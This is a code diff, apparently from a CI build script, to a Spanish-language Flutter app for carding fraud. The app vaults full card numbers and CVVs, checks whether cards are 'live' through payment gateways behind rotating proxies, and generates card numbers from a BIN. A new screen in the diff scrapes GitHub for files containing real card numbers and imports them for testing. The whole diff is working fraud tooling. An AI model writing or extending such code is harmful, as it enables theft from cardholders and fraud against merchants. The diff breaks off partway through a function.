-            void setUseProxies(bool v) { state = state.copyWith(useProxies: v); _save(); }
-            void setAutoTune(bool v) { state = state.copyWith(autoTune: v); _save(); }
-            void setDoh(bool v) { state = state.copyWith(doh: v); _save(); }
-            void setProxySticky(bool v) { state = state.copyWith(proxySticky: v); _save(); }
-            void setWifiOnly(bool v) { state = state.copyWith(wifiOnly: v); _save(); }
-            void setConcurrency(int v) { state = state.copyWith(concurrency: v); _save(); }
-            void setTimeoutSec(int v) { state = state.copyWith(timeoutSec: v); _save(); }
-            void setProbeUrl(String v) { state = state.copyWith(probeUrl: v); _save(); }
-            void setBiometrics(bool v) { state = state.copyWith(biometrics: v); _save(); }
-            void setAutoLock(int v) { state = state.copyWith(autoLockMin: v); _save(); }
-            Future<void> setOfflineDb(bool v) async { state = state.copyWith(offlineDb: v); await _save(); }
+            void setEngine(String v) {
+              state = state.copyWith(engine: v);
+              _save();
+            }
+
+            void setStripeKey(String v) {
+              state = state.copyWith(stripeKey: v);
+              _save();
+            }
+
+            void setDorkillKey(String v) {
+              state = state.copyWith(dorkillKey: v);
+              _save();
+            }
+
+            void setRetries(int v) {
+              state = state.copyWith(retries: v);
+              _save();
+            }
+
+            void setUseProxies(bool v) {
+              state = state.copyWith(useProxies: v);
+              _save();
+            }
+
+            void setAutoTune(bool v) {
+              state = state.copyWith(autoTune: v);
+              _save();
+            }
+
+            void setDoh(bool v) {
+              state = state.copyWith(doh: v);
+              _save();
+            }
+
+            void setProxySticky(bool v) {
+              state = state.copyWith(proxySticky: v);
+              _save();
+            }
+
+            void setConcurrency(int v) {
+              state = state.copyWith(concurrency: v);
+              _save();
+            }
+
+            void setTimeoutSec(int v) {
+              state = state.copyWith(timeoutSec: v);
+              _save();
+            }
+
+            void setProbeUrl(String v) {
+              state = state.copyWith(probeUrl: v);
+              _save();
+            }
+
+            void setAutoLock(int v) {
+              state = state.copyWith(autoLockMin: v);
+              _save();
+            }
+
+            Future<void> setOfflineDb(bool v) async {
+              state = state.copyWith(offlineDb: v);
+              await _save();
+            }
+
+            void setBiometrics(bool v) {
+              state = state.copyWith(biometrics: v);
+              Vault.i.setBioEnabled(v);
+              _save();
+            }
           }
 
           final cardsProvider = StateNotifierProvider<CardsNotifier, List<CreditCard>>((ref) => CardsNotifier());
 
           class CardsNotifier extends StateNotifier<List<CreditCard>> {
-            CardsNotifier() : super(const []) {
+            CardsNotifier() : super(const <CreditCard>[]) {
               final raw = Vault.i.data['cards'];
               if (raw is List) {
                 state = raw.map((e) => CreditCard.fromJson((e as Map).cast<String, dynamic>())).toList();
@@ -1844,7 +3181,7 @@ jobs:
             }
 
             Future<void> clear() async {
-              state = const [];
+              state = const <CreditCard>[];
               await persist();
             }
 
@@ -1859,11 +3196,6 @@ jobs:
               await persist();
             }
 
-            Future<void> update(CreditCard card) async {
-              state = state.map((c) => c.id == card.id ? card : c).toList();
-              await persist();
-            }
-
             void markChecking(List<String> ids) {
               final set = ids.toSet();
               state = state.map((c) => set.contains(c.id) ? c.copyWith(status: CheckStatus.checking) : c).toList();
@@ -1872,15 +3204,40 @@ jobs:
             void applyBatch(Map<String, CheckResult> rs) {
               if (rs.isEmpty) return;
               final now = DateTime.now();
+
               state = state.map((c) {
                 final r = rs[c.id];
                 if (r == null) return c;
+
+                var bank = c.bank;
+                var country = c.country;
+                var cardType = c.cardType;
+
+                if (r.binRaw.isNotEmpty) {
+                  final parts = r.binRaw.split(RegExp(r'\s*-\s*'));
+                  for (final part in parts) {
+                    final v = part.trim();
+                    if (v.isEmpty) continue;
+                    final low = v.toLowerCase();
+                    if (low == 'credit' || low == 'debit' || low == 'prepaid') {
+                      cardType = low;
+                    } else if (v.length == 2 && hasAlpha(v)) {
+                      country = v.toUpperCase();
+                    } else if (bank.isEmpty) {
+                      bank = v;
+                    }
+                  }
+                }
+
                 return c.copyWith(
                   status: r.status,
                   message: r.message,
                   gateway: r.gateway,
                   latencyMs: r.latencyMs,
                   checkedAt: now,
+                  bank: bank,
+                  country: country,
+                  cardType: cardType,
                 );
               }).toList();
             }
@@ -1889,7 +3246,7 @@ jobs:
           final proxiesProvider = StateNotifierProvider<ProxiesNotifier, List<ProxyNode>>((ref) => ProxiesNotifier());
 
           class ProxiesNotifier extends StateNotifier<List<ProxyNode>> {
-            ProxiesNotifier() : super(const []) {
+            ProxiesNotifier() : super(const <ProxyNode>[]) {
               final raw = Vault.i.data['proxies'];
               if (raw is List) {
                 state = raw.map((e) => ProxyNode.fromJson((e as Map).cast<String, dynamic>())).toList();
@@ -1906,8 +3263,21 @@ jobs:
               await persist();
             }
 
+            Future<void> addAll(List<ProxyNode> list) async {
+              if (list.isEmpty) return;
+              final ids = list.map((p) => p.id).toSet();
+              state = [...state.where((p) => !ids.contains(p.id)), ...list];
+              await persist();
+            }
+
             Future<void> remove(String id) async {
               state = state.where((p) => p.id != id).toList();
+              await persist();
+            }
+
+            Future<void> removeMany(Set<String> ids) async {
+              if (ids.isEmpty) return;
+              state = state.where((p) => !ids.contains(p.id)).toList();
               await persist();
             }
 
@@ -1916,6 +3286,18 @@ jobs:
                 if (p.id != id) return p;
                 p.health = h;
                 p.latencyMs = ms;
+                return p;
+              }).toList();
+              await persist();
+            }
+
+            Future<void> setHealthMany(Map<String, (ProxyHealth, int)> m) async {
+              if (m.isEmpty) return;
+              state = state.map((p) {
+                final v = m[p.id];
+                if (v == null) return p;
+                p.health = v.$1;
+                p.latencyMs = v.$2;
                 return p;
               }).toList();
               await persist();
@@ -1955,6 +3337,218 @@ jobs:
           final setupProvider = StateProvider<bool>((ref) => Vault.i.setupDone);
           final tabProvider = StateProvider<int>((ref) => 0);
           final binStatusProvider = StateProvider<BinStatus>((ref) => const BinStatus());
+
+          void refreshVaultScoped(Ref ref) {
+            ref.invalidate(settingsProvider);
+            ref.invalidate(cardsProvider);
+            ref.invalidate(proxiesProvider);
+            ref.invalidate(sourcesProvider);
+          }
+
+          final sourcesProvider = StateNotifierProvider<SourcesNotifier, List<ScrapeSource>>((ref) => SourcesNotifier());
+
+          class SourcesNotifier extends StateNotifier<List<ScrapeSource>> {
+            SourcesNotifier() : super(defaultSources) {
+              final raw = Vault.i.data['sources'];
+              if (raw is List && raw.isNotEmpty) {
+                state = raw.map((e) => ScrapeSource.fromJson((e as Map).cast<String, dynamic>())).toList();
+              }
+            }
+
+            Future<void> persist() async {
+              Vault.i.data['sources'] = state.map((s) => s.toJson()).toList();
+              await Vault.i.save();
+            }
+
+            Future<void> upsert(ScrapeSource s) async {
+              state = [...state.where((x) => x.id != s.id), s];
+              await persist();
+            }
+
+            Future<void> remove(String id) async {
+              state = state.where((x) => x.id != id).toList();
+              await persist();
+            }
+
+            Future<void> reset() async {
+              state = defaultSources;
+              await persist();
+            }
+          }
+
+          class ScrapeState {
+            const ScrapeState({
+              this.running = false,
+              this.done = 0,
+              this.total = 0,
+              this.current = '',
+              this.reports = const <ScrapeReport>[],
+              this.staged = const <CreditCard>[],
+              this.onlineBin = false,
+            });
+
+            final bool running;
+            final int done;
+            final int total;
+            final String current;
+            final List<ScrapeReport> reports;
+            final List<CreditCard> staged;
+            final bool onlineBin;
+
+            double get pct => total == 0 ? 0 : done / total;
+
+            ScrapeState copyWith({
+              bool? running,
+              int? done,
+              int? total,
+              String? current,
+              List<ScrapeReport>? reports,
+              List<CreditCard>? staged,
+              bool? onlineBin,
+            }) =>
+                ScrapeState(
+                  running: running ?? this.running,
+                  done: done ?? this.done,
+                  total: total ?? this.total,
+                  current: current ?? this.current,
+                  reports: reports ?? this.reports,
+                  staged: staged ?? this.staged,
+                  onlineBin: onlineBin ?? this.onlineBin,
+                );
+          }
+
+          final scrapeProvider = StateNotifierProvider<ScrapeNotifier, ScrapeState>((ref) => ScrapeNotifier(ref));
+
+          class ScrapeNotifier extends StateNotifier<ScrapeState> {
+            ScrapeNotifier(this.ref) : super(const ScrapeState());
+
+            final Ref ref;
+            bool _cancel = false;
+
+            void setOnlineBin(bool v) => state = state.copyWith(onlineBin: v);
+
+            void cancel() => _cancel = true;
+
+            void clear() => state = ScrapeState(onlineBin: state.onlineBin);
+
+            Future<void> pullUrl(String url, {int limit = 300}) async {
+              final host = Uri.tryParse(url)?.host ?? url;
+              await pull(<ScrapeSource>[ScrapeSource(id: 'url', name: host, url: url)], limit: limit);
+            }
+
+            Future<void> pull(List<ScrapeSource> list, {int limit = 300}) async {
+              if (state.running || list.isEmpty) return;
+              _cancel = false;
+
+              final startReports = state.reports;
+              final startStaged = state.staged;
+              final onlineBin = state.onlineBin;
+
+              state = ScrapeState(
+                running: true,
+                total: list.length,
+                reports: startReports,
+                staged: startStaged,
+                onlineBin: onlineBin,
+              );
+
+              final engine = CheckEngine(ref.read(settingsProvider), proxies: ref.read(proxiesProvider));
+              final seen = ref.read(cardsProvider).map((c) => c.pan).toSet();
+              for (final c in startStaged) {
+                seen.add(c.pan);
+              }
+
+              final reports = <ScrapeReport>[...startReports];
+              final staged = <CreditCard>[...startStaged];
+              var done = 0;
+
+              try {
+                for (final s in list) {
+                  if (_cancel) break;
+                  state = state.copyWith(current: s.name, done: done);
+
+                  final r = await Scraper(engine, limit: limit).pull(s, existing: seen);
+                  for (final c in r.cards) {
+                    seen.add(c.pan);
+                  }
+                  staged.addAll(r.cards);
+                  reports.add(r);
+                  done++;
+
+                  state = state.copyWith(
+                    done: done,
+                    current: s.name,
+                    reports: List<ScrapeReport>.of(reports),
+                    staged: List<CreditCard>.of(staged),
+                  );
+                }
+              } finally {
+                engine.dispose();
+              }
+
+              state = state.copyWith(running: false, current: '');
+            }
+
+            Future<void> commit({bool andRun = false}) async {
+              final cards = state.staged;
+              if (cards.isEmpty) return;
+
+              await BinDb.i.loadIndex();
+
+              var out = cards
+                  .map((c) {
+                    final i = BinDb.i.lookup(c.pan);
+                    return i == null ? c : c.copyWith(bank: i.bank, country: i.country, cardType: i.cardType, level: i.level);
+                  })
+                  .toList();
+
+              if (state.onlineBin) out = await _onlineEnrich(out);
+
+              await ref.read(cardsProvider.notifier).addAll(out);
+              final ids = out.map((c) => c.id).toList();
+              state = ScrapeState(onlineBin: state.onlineBin);
+
+              if (andRun) {
+                ref.read(tabProvider.notifier).state = 0;
+                await ref.read(runProvider.notifier).run(ids: ids);
+              }
+            }
+
+            Future<List<CreditCard>> _onlineEnrich(List<CreditCard> cards) async {
+              final need = cards.where((c) => c.bank.isEmpty).take(150).toList();
+              if (need.isEmpty) return cards;
+
+              final engine = CheckEngine(ref.read(settingsProvider), proxies: ref.read(proxiesProvider));
+              final resolver = OnlineBin(engine);
+              final cache = <String, BinInfo?>{};
+              var cursor = 0;
+
+              Future<void> worker() async {
+                while (true) {
+                  final i = cursor;
+                  if (i >= need.length) return;
+                  cursor++;
+
+                  final key = need[i].pan.length >= 6 ? need[i].pan.substring(0, 6) : need[i].pan;
+                  if (!cache.containsKey(key)) {
+                    cache[key] = await resolver.lookup(key);
+                    await Future.delayed(const Duration(milliseconds: 240));
+                  }
+                }
+              }
+
+              await Future.wait(List.generate(2, (_) => worker()));
+              engine.dispose();
+
+              return cards.map((c) {
+                if (c.bank.isNotEmpty) return c;
+                final key = c.pan.length >= 6 ? c.pan.substring(0, 6) : c.pan;
+                final info = cache[key];
+                if (info == null) return c;
+                return c.copyWith(bank: info.bank, country: info.country, cardType: info.cardType, level: info.level);
+              }).toList();
+            }
+          }
 
           class RunStats {
             const RunStats({
@@ -2034,8 +3628,7 @@ jobs:
               var proxies = ref.read(proxiesProvider);
               final all = ref.read(cardsProvider);
 
-              var targets =
-                  ids == null ? List<CreditCard>.from(all) : all.where((c) => ids.contains(c.id)).toList();
+              var targets = ids == null ? List<CreditCard>.from(all) : all.where((c) => ids.contains(c.id)).toList();
               if (onlyPending) {
                 targets = targets.where((c) => c.status != CheckStatus.live).toList();
               }
@@ -2047,7 +3640,7 @@ jobs:
 
               if (settings.proxySticky && settings.useProxies) {
                 final pool = proxies.where((p) => p.health != ProxyHealth.down).toList();
-                if (pool.isNotEmpty) proxies = [pool[Random().nextInt(pool.length)]];
+                if (pool.isNotEmpty) proxies = <ProxyNode>[pool[Random().nextInt(pool.length)]];
               }
 
               await BinDb.i.loadIndex();
@@ -2128,7 +3721,9 @@ jobs:
 
             void stop() => _runner?.stop();
 
-            Future<void> setConcurrency(int n) async => _runner?.setConcurrency(n);
+            Future<void> setConcurrency(int n) async {
+              await _runner?.setConcurrency(n);
+            }
           }
           DART
 
@@ -2154,7 +3749,6 @@ jobs:
               if (!running && stats.total == 0) return const SizedBox.shrink();
 
               final settings = ref.watch(settingsProvider);
-              final pct = stats.total == 0 ? 0.0 : stats.done / stats.total;
 
               var rate = 0.0;
               var eta = 0;
@@ -2173,9 +3767,7 @@ jobs:
                 decoration: BoxDecoration(
                   color: AppColors.glass.withOpacity(0.65),
                   borderRadius: BorderRadius.circular(14),
-                  border: Border.all(
-                    color: stats.paused ? AppColors.amber.withOpacity(0.6) : AppColors.glassStroke,
-                  ),
+                  border: Border.all(color: stats.paused ? AppColors.amber.withOpacity(0.6) : AppColors.glassStroke),
                 ),
                 child: Column(
                   crossAxisAlignment: CrossAxisAlignment.start,
@@ -2230,7 +3822,7 @@ jobs:
                       ],
                     ),
                     const SizedBox(height: 6),
-                    SegmentedProgress(value: pct, color: stats.paused ? AppColors.amber : AppColors.lime),
+                    SegmentedProgress(value: stats.pct, color: stats.paused ? AppColors.amber : AppColors.lime),
                     const SizedBox(height: 8),
                     Row(
                       children: [
@@ -2279,8 +3871,7 @@ jobs:
                               if (txt.isEmpty) return;
                               await Clipboard.setData(ClipboardData(text: txt));
                               if (context.mounted) {
-                                ScaffoldMessenger.of(context)
-                                    .showSnackBar(const SnackBar(content: Text('Vivas copiadas')));
+                                ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Vivas copiadas')));
                               }
                             },
                           ),
@@ -2291,8 +3882,7 @@ jobs:
                             label: 'Revisar pendientes',
                             icon: Icons.refresh,
                             color: AppColors.cyan,
-                            onPressed:
-                                running ? null : () => ref.read(runProvider.notifier).run(onlyPending: true),
+                            onPressed: running ? null : () => ref.read(runProvider.notifier).run(onlyPending: true),
                           ),
                         ),
                       ],
@@ -2414,6 +4004,8 @@ jobs:
                 await Vault.i.setPassword('');
               }
 
+              refreshVaultScoped(ref);
+
               ref.read(settingsProvider.notifier).setBiometrics(withPin && _bio && _hasBio);
               if (withPin && _bio && _hasBio) await Vault.i.rememberPass();
 
@@ -2514,14 +4106,18 @@ jobs:
             @override
             void initState() {
               super.initState();
-              WidgetsBinding.instance.addPostFrameCallback((_) async {
-                if (!Vault.i.hasPassword) {
-                  await Vault.i.unlock('');
-                  if (mounted) ref.read(lockProvider.notifier).state = false;
-                  return;
-                }
-                await _tryBio();
-              });
+              WidgetsBinding.instance.addPostFrameCallback((_) => _boot());
+            }
+
+            Future<void> _boot() async {
+              if (!Vault.i.hasPassword) {
+                await Vault.i.unlock('');
+                if (!mounted) return;
+                refreshVaultScoped(ref);
+                ref.read(lockProvider.notifier).state = false;
+                return;
+              }
+              await _tryBio();
             }
 
             @override
@@ -2530,8 +4126,13 @@ jobs:
               super.dispose();
             }
 
+            void _enter() {
+              refreshVaultScoped(ref);
+              ref.read(lockProvider.notifier).state = false;
+            }
+
             Future<void> _tryBio() async {
-              if (!ref.read(settingsProvider).biometrics) return;
+              if (!Vault.i.bioEnabled) return;
 
               final pass = Vault.i.storedPass;
               if (pass == null) return;
@@ -2542,8 +4143,7 @@ jobs:
                   options: const AuthenticationOptions(stickyAuth: true),
                 );
                 if (!ok) return;
-                await Vault.i.unlock(pass);
-                if (mounted) ref.read(lockProvider.notifier).state = false;
+                if (await Vault.i.unlock(pass) && mounted) _enter();
               } catch (_) {}
             }
 
@@ -2553,7 +4153,7 @@ jobs:
                 setState(() => _err = 'PIN incorrecto');
                 return;
               }
-              ref.read(lockProvider.notifier).state = false;
+              _enter();
             }
 
             @override
@@ -2604,13 +4204,13 @@ jobs:
           import 'package:flutter_riverpod/flutter_riverpod.dart';
 
           import '../logo.dart';
-          import '../net.dart';
           import '../providers.dart';
           import '../repos.dart';
           import '../theme.dart';
           import 'analysis.dart';
           import 'import.dart';
           import 'proxies.dart';
+          import 'scrape.dart';
           import 'settings.dart';
           import 'vault.dart';
 
@@ -2626,6 +4226,7 @@ jobs:
             static const _tabs = [
               (Icons.inventory_2_outlined, 'Boveda'),
               (Icons.upload_file, 'Importar'),
+              (Icons.travel_explore, 'Web'),
               (Icons.insights, 'Analisis'),
               (Icons.lan_outlined, 'Proxies'),
               (Icons.settings, 'Ajustes'),
@@ -2730,6 +4331,7 @@ jobs:
                   children: const [
                     VaultScreen(),
                     ImportScreen(),
+                    ScrapeScreen(),
                     AnalysisScreen(),
                     ProxiesScreen(),
                     SettingsScreen(),
@@ -2823,12 +4425,7 @@ jobs:
                   continue;
                 }
                 hits++;
-                out.add(c.copyWith(
-                  bank: info.bank,
-                  country: info.country,
-                  cardType: info.cardType,
-                  level: info.level,
-                ));
+                out.add(c.copyWith(bank: info.bank, country: info.country, cardType: info.cardType, level: info.level));
               }
 
               await notifier.replaceAll(out);
@@ -3032,61 +4629,63 @@ jobs:
                 context: context,
                 backgroundColor: AppColors.bgElevated,
                 shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
-                builder: (ctx) => Padding(
-                  padding: const EdgeInsets.all(20),
-                  child: Column(
-                    mainAxisSize: MainAxisSize.min,
-                    crossAxisAlignment: CrossAxisAlignment.start,
-                    children: [
-                      Text(maskPan(c.pan), style: AppTextStyles.h2),
-                      const SizedBox(height: 14),
-                      _row('Pan completo', c.pan),
-                      _row('Vencimiento', c.expLabel),
-                      _row('CVV', c.cvv),
-                      _row('Marca', schemeNames[c.brand] ?? c.brand),
-                      if (c.bank.isNotEmpty) _row('Banco', c.bank),
-                      if (c.country.isNotEmpty)
-                        _row('Pais', '${flagEmoji(c.country)} ${countryNames[c.country] ?? c.country}'),
-                      if (c.cardType.isNotEmpty) _row('Tipo', c.cardType),
-                      if (c.level.isNotEmpty) _row('Nivel', c.level),
-                      _row('Estado', c.status.label),
-                      if (c.message.isNotEmpty) _row('Respuesta', c.message),
-                      if (c.checkedAt != null) _row('Revisada', c.checkedAt!.toLocal().toString().substring(0, 16)),
-                      const SizedBox(height: 16),
-                      Wrap(
-                        spacing: 10,
-                        runSpacing: 10,
-                        children: [
-                          NeonButton(
-                            label: 'Copiar',
-                            icon: Icons.copy,
-                            onPressed: () async {
-                              await Clipboard.setData(ClipboardData(text: c.line));
-                              if (ctx.mounted) Navigator.pop(ctx);
-                              _snack('Copiada');
-                            },
-                          ),
-                          NeonButton(
-                            label: 'Revisar',
-                            icon: Icons.play_arrow,
-                            color: AppColors.cyan,
-                            onPressed: () {
-                              Navigator.pop(ctx);
-                              ref.read(runProvider.notifier).run(ids: [c.id]);
-                            },
-                          ),
-                          NeonButton(
-                            label: 'Borrar',
-                            icon: Icons.delete_outline,
-                            color: AppColors.red,
-                            onPressed: () {
-                              Navigator.pop(ctx);
-                              ref.read(cardsProvider.notifier).remove(c.id);
-                            },
-                          ),
-                        ],
-                      ),
-                    ],
+                builder: (ctx) => SingleChildScrollView(
+                  child: Padding(
+                    padding: const EdgeInsets.all(20),
+                    child: Column(
+                      mainAxisSize: MainAxisSize.min,
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        Text(maskPan(c.pan), style: AppTextStyles.h2),
+                        const SizedBox(height: 14),
+                        _row('Pan completo', c.pan),
+                        _row('Vencimiento', c.expLabel),
+                        _row('CVV', c.cvv),
+                        _row('Marca', schemeNames[c.brand] ?? c.brand),
+                        if (c.bank.isNotEmpty) _row('Banco', c.bank),
+                        if (c.country.isNotEmpty)
+                          _row('Pais', '${flagEmoji(c.country)} ${countryNames[c.country] ?? c.country}'),
+                        if (c.cardType.isNotEmpty) _row('Tipo', c.cardType),
+                        if (c.level.isNotEmpty) _row('Nivel', c.level),
+                        _row('Estado', c.status.label),
+                        if (c.message.isNotEmpty) _row('Respuesta', c.message),
+                        if (c.checkedAt != null) _row('Revisada', c.checkedAt!.toLocal().toString().substring(0, 16)),
+                        const SizedBox(height: 16),
+                        Wrap(
+                          spacing: 10,
+                          runSpacing: 10,
+                          children: [
+                            NeonButton(
+                              label: 'Copiar',
+                              icon: Icons.copy,
+                              onPressed: () async {
+                                await Clipboard.setData(ClipboardData(text: c.line));
+                                if (ctx.mounted) Navigator.pop(ctx);
+                                _snack('Copiada');
+                              },
+                            ),
+                            NeonButton(
+                              label: 'Revisar',
+                              icon: Icons.play_arrow,
+                              color: AppColors.cyan,
+                              onPressed: () {
+                                Navigator.pop(ctx);
+                                ref.read(runProvider.notifier).run(ids: [c.id]);
+                              },
+                            ),
+                            NeonButton(
+                              label: 'Borrar',
+                              icon: Icons.delete_outline,
+                              color: AppColors.red,
+                              onPressed: () {
+                                Navigator.pop(ctx);
+                                ref.read(cardsProvider.notifier).remove(c.id);
+                              },
+                            ),
+                          ],
+                        ),
+                      ],
+                    ),
                   ),
                 ),
               );
@@ -3110,6 +4709,7 @@ jobs:
           import 'package:flutter_riverpod/flutter_riverpod.dart';
 
           import '../bin_db.dart';
+          import '../bin_gen.dart';
           import '../core.dart';
           import '../import_engine.dart';
           import '../models.dart';
@@ -3125,19 +4725,32 @@ jobs:
 
           class _ImportScreenState extends ConsumerState<ImportScreen> {
             final _ctrl = TextEditingController();
+            final _genBin = TextEditingController(text: '424242');
             ImportResult? _res;
             bool _enrich = true;
             bool _repair = true;
             bool _busy = false;
             String _progress = '';
+            double _genCount = 25;
+            double _genLen = 16;
 
             @override
             void dispose() {
               _ctrl.dispose();
+              _genBin.dispose();
               super.dispose();
             }
 
             void _parse() => setState(() => _res = parseCards(_ctrl.text, repairLuhn: _repair));
+
+            void _generate() {
+              final cards = generateCards(GenSpec(bin: _genBin.text, count: _genCount.round(), length: _genLen.round()));
+              if (cards.isEmpty) {
+                ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('BIN muy corto')));
+                return;
+              }
+              setState(() => _res = ImportResult(cards: cards));
+            }
 
             Future<void> _commit({required bool andRun}) async {
               final res = _res;
@@ -3165,7 +4778,10 @@ jobs:
                   enriched.add(c);
                 }
                 done++;
-                if (done % 25 == 0 && mounted) setState(() => _progress = '$done/${res.cards.length}');
+                if (done % 500 == 0) {
+                  if (mounted) setState(() => _progress = '$done/${res.cards.length}');
+                  await Future<void>.delayed(Duration.zero);
+                }
               }
 
               await ref.read(cardsProvider.notifier).addAll(enriched);
@@ -3178,9 +4794,7 @@ jobs:
                 _res = null;
               });
 
-              ScaffoldMessenger.of(context).showSnackBar(
-                SnackBar(content: Text('${res.cards.length} tarjetas agregadas')),
-              );
+              ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('${res.cards.length} tarjetas agregadas')));
 
               if (andRun) {
                 ref.read(tabProvider.notifier).state = 0;
@@ -3202,7 +4816,7 @@ jobs:
                       maxLines: 10,
                       style: AppTextStyles.mono,
                       decoration: const InputDecoration(
-                        hintText: 'pan|mm|yy|cvv  ·  una por linea  ·  acepta barras, comas o espacios',
+                        hintText: 'pan|mm|yy|cvv  ·  una por linea  ·  acepta barras, comas, espacios y guiones',
                         hintStyle: AppTextStyles.caption,
                         border: InputBorder.none,
                       ),
@@ -3216,7 +4830,7 @@ jobs:
                         SwitchListTile(
                           contentPadding: EdgeInsets.zero,
                           title: const Text('Completar datos del BIN', style: AppTextStyles.body),
-                          subtitle: const Text('Banco, pais, tipo y nivel', style: AppTextStyles.caption),
+                          subtitle: const Text('Banco, pais y tipo desde la base offline', style: AppTextStyles.caption),
                           value: _enrich,
                           activeColor: AppColors.lime,
                           onChanged: (v) => setState(() => _enrich = v),
@@ -3249,6 +4863,44 @@ jobs:
                       ),
                     ],
                   ),
+                  const SectionHeader('Generar desde un BIN'),
+                  GlassPanel(
+                    child: Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        TextField(
+                          controller: _genBin,
+                          style: AppTextStyles.mono,
+                          decoration: const InputDecoration(labelText: 'BIN / prefijo', labelStyle: AppTextStyles.caption),
+                        ),
+                        const SizedBox(height: 10),
+                        Text('cantidad ${_genCount.round()}', style: AppTextStyles.body),
+                        Slider(
+                          value: _genCount,
+                          min: 1,
+                          max: 200,
+                          divisions: 199,
+                          onChanged: (v) => setState(() => _genCount = v),
+                        ),
+                        Text('largo del PAN ${_genLen.round()}', style: AppTextStyles.body),
+                        Slider(
+                          value: _genLen,
+                          min: 12,
+                          max: 19,
+                          divisions: 7,
+                          onChanged: (v) => setState(() => _genLen = v),
+                        ),
+                        const SizedBox(height: 6),
+                        NeonButton(
+                          label: 'Generar y analizar',
+                          icon: Icons.auto_fix_high,
+                          color: AppColors.violet,
+                          expand: true,
+                          onPressed: _busy ? null : _generate,
+                        ),
+                      ],
+                    ),
+                  ),
                   if (res != null) ...[
                     const SectionHeader('Vista previa'),
                     GlassPanel(
@@ -3272,14 +4924,17 @@ jobs:
                                   child: Text('${maskPan(c.pan)}  ${c.expLabel}  ${c.cvv}', style: AppTextStyles.mono),
                                 ),
                               ),
-                          if (res.cards.length > 12)
-                            Text('y ${res.cards.length - 12} mas', style: AppTextStyles.caption),
+                          if (res.cards.length > 12) Text('y ${res.cards.length - 12} mas', style: AppTextStyles.caption),
                         ],
                       ),
                     ),
+                    if (_busy && _progress.isNotEmpty) ...[
+                      const SizedBox(height: 8),
+                      Text('procesando $_progress', style: AppTextStyles.caption),
+                    ],
                     const SizedBox(height: 14),
                     NeonButton(
-                      label: _busy ? 'Procesando $_progress' : 'Guardar ${fmtInt(res.cards.length)}',
+                      label: _busy ? 'Procesando' : 'Guardar ${fmtInt(res.cards.length)}',
                       icon: Icons.save_alt,
                       expand: true,
                       onPressed: res.cards.isEmpty || _busy ? null : () => _commit(andRun: false),
@@ -3299,10 +4954,687 @@ jobs:
           }
           DART
 
+          cat > lib/screens/scrape.dart <<'DART'
+          import 'package:flutter/material.dart';
+          import 'package:flutter_riverpod/flutter_riverpod.dart';
+
+          import '../core.dart';
+          import '../finder.dart';
+          import '../models.dart';
+          import '../providers.dart';
+          import '../repos.dart';
+          import '../scraper.dart';
+          import '../theme.dart';
+          import '../widgets.dart';
+
+          class ScrapeScreen extends ConsumerStatefulWidget {
+            const ScrapeScreen({super.key});
+            @override
+            ConsumerState<ScrapeScreen> createState() => _ScrapeScreenState();
+          }
+
+          class _ScrapeScreenState extends ConsumerState<ScrapeScreen> {
+            final _picked = <String>{};
+            final _url = TextEditingController();
+            final _query = TextEditingController(text: 'cc checker');
+            final _token = TextEditingController();
+            final _pickedFound = <String>{};
+            List<FoundSource> _found = [];
+            bool _finding = false;
+            bool _scoring = false;
+            String _step = '';
+            double _limit = 300;
+            double _repos = 8;
+            double _sample = 10;
+
+            @override
+            void initState() {
+              super.initState();
+              _token.text = (Vault.i.data['gh_token'] ?? '').toString();
+            }
+
+            @override
+            void dispose() {
+              _url.dispose();
+              _query.dispose();
+              _token.dispose();
+              super.dispose();
+            }
+
+            // Los sheets siguen construyendo sus campos durante la animacion de
+            // salida: si se liberan de golpe, revientan con "used after disposed".
+            void _disposeLater(List<TextEditingController> cs) {
+              Future<void>.delayed(const Duration(milliseconds: 350), () {
+                for (final c in cs) {
+                  c.dispose();
+                }
+              });
+            }
+
+            void _snack(String m) {
+              if (!mounted) return;
+              ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(m)));
+            }
+
+            void _sortFound() {
+              _found.sort((a, b) {
+                final ra = a.hitRate;
+                final rb = b.hitRate;
+                if (ra != null && rb != null && ra != rb) return rb.compareTo(ra);
+                if (ra != null && rb == null) return -1;
+                if (ra == null && rb != null) return 1;
+                return b.cards.compareTo(a.cards);
+              });
+            }
+
+            Future<void> _runFinder() async {
+              final q = _query.text.trim().isEmpty ? 'cc checker' : _query.text.trim();
+
+              setState(() {
+                _finding = true;
+                _found = [];
+                _pickedFound.clear();
+                _step = 'iniciando';
+              });
+
+              final engine = CheckEngine(ref.read(settingsProvider), proxies: ref.read(proxiesProvider));
+
+              try {
+                final res = await SourceFinder(engine, token: _token.text.trim()).search(
+                  query: q,
+                  maxRepos: _repos.round(),
+                  onStep: (s, d, t) {
+                    if (!mounted) return;
+                    setState(() => _step = t > 1 ? '$s ($d/$t)' : s);
+                  },
+                );
+
+                if (!mounted) return;
+                setState(() {
+                  _found = res;
+                  _finding = false;
+                  _step = res.isEmpty ? 'sin archivos con tarjetas reales' : '${res.length} fuentes verificadas';
+                });
+              } catch (e) {
+                if (!mounted) return;
+                setState(() {
+                  _finding = false;
+                  _step = SourceFinder.isRate(e)
+                      ? 'GitHub te limito. Pon un token o espera una hora.'
+                      : 'error: ${Scraper.shortError(e)}';
+                });
+              } finally {
+                engine.dispose();
+              }
+            }
+
+            Future<void> _runScore() async {
+              if (_found.isEmpty) return;
+
+              setState(() {
+                _scoring = true;
+                _step = 'puntuando';
+              });
+
+              final engine = CheckEngine(ref.read(settingsProvider), proxies: ref.read(proxiesProvider));
+
+              try {
+                await SourceFinder(engine, token: _token.text.trim()).scoreAll(
+                  _found,
+                  sample: _sample.round(),
+                  onStep: (s, d, t) {
+                    if (!mounted) return;
+                    setState(() => _step = '$s ($d/$t)');
+                  },
+                );
+              } catch (e) {
+                if (mounted) setState(() => _step = 'error: ${Scraper.shortError(e)}');
+              } finally {
+                engine.dispose();
+                if (!mounted) return;
+                setState(() {
+                  _scoring = false;
+                  _sortFound();
+                  _step = 'puntuacion lista';
+                });
+              }
+            }
+
+            Future<void> _addFound() async {
+              final sel = _found.where((f) => _pickedFound.contains(f.url)).toList();
+              if (sel.isEmpty) return;
+
+              for (final f in sel) {
